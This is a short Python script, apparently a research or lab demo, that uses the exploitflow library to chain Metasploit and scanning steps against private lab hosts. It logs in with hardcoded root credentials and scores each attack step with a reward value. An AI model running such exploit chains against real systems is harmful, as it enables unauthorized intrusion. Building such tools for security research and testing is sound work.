import math
import random
import sys
import exploitflow as ef
from wasabi import color
from exploitflow.state import State_v4
State_default = State_v4
import itertools

flow = ef.Flow()

## set options
ef.targets.target = "192.168.2.1"
ef.versions.target = "192.168.2.10"
msf_options = {
    "RHOSTS": "192.168.2.10",
    "USERNAME": "root",
    "PASSWORD": "easybot"
}        
ef.metasploit.set_options(msf_options)
ef.metasploit.target = "192.168.2.10"

## set reward
ef.idle.reward = 0
ef.metasploit.reward = -100  # first time successful, will do "*(-1)" to get "+100"
ef.versions.reward = -10
ef.targets.reward = -10


exploits = [ef.idle, ef.metasploit, ef.versions, ef.targets]

# Get all permutations of the list
permutations = list(itertools.permutations(exploits))
state = flow.run(ef.init)
for perm in permutations:
    for expl in perm:
        state = flow.run(flow.state() * expl)

print(flow)

# # ASCII-depict graph
# print(flow.ascii())

flow.to_dot("/tmp/exploitflow.dot")